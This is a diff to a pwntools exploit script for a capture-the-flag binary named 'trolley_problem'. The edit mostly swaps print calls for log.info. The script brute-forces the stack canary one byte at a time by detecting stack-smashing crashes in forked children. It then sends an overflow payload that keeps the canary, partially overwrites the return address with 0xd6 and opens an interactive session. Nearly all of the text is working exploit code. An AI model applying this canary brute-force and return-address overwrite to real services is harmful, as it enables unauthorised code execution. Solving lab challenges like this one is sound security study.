@@ -8,33 +8,28 @@ p = gdb.debug('./src/chall', '''
     set follow-fork-mode child
     set detach-on-fork off
     b *(trolley_problem+302)
-    c
+    continue
 ''')
 
 # p = remote('trolley-problem.harkonnen.b01lersc.tf', 8443, ssl=True)
 
+log.info("Brute-forcing canary value byte by byte...")
 canary_bytes = b'\x00'
-print(f"Starting canary bruteforce with initial byte: {canary_bytes.hex()}")
-
-for byte_pos in range(7):
-    print(f"Bruteforcing byte position {byte_pos+1}/7...")
+for byte_position in range(7):
     for i in range(256):
         if bytes([i]) == b'\x0a':
             continue
-        temp_canary_bytes = canary_bytes
-        temp_canary_bytes += bytes([i])
-        p.sendlineafter(b'What do you do?\n', b'A')
-        p.sendlineafter(b'What do you do?\n', b'A'*0x18+temp_canary_bytes)
-        if b'** stack smashing detected ***: terminated\n' not in p.recvuntil(b'Oh no!'):
+        p.sendlineafter(b"What do you do?\n", b'A')
+        p.sendlineafter(b"What do you do?\n", b'A'*0x18+canary_bytes+bytes([i]))
+        if b"** stack smashing detected ***: terminated\n" not in p.recvuntil(b"Oh no!"):
             canary_bytes += bytes([i])
-            print(f"Found byte \\x{i:02x} at position {byte_pos+1}")
-            print(f"Current canary: {canary_bytes.hex(' ')}")
+            log.info(f"Found byte \\x{i:02x} at position {byte_position+1+1}/8!")
             break
-
 canary_value = u64(canary_bytes)
-print(f"Full canary value found: {hex(canary_value)}")
-print("Sending final payload with return address override...")
-p.sendlineafter(b'What do you do?\n', b'A'*0x18+canary_bytes+b'A'*0x8+b'\xd6')
+log.info(f"Found full canary value: {hex(canary_value)}")
+
+log.info("Partially overwriting return address...")
+p.sendlineafter(b"What do you do?\n", b'A'*0x18+p64(canary_value)+b'A'*0x8+b'\xd6')
 
 p.interactive()
 
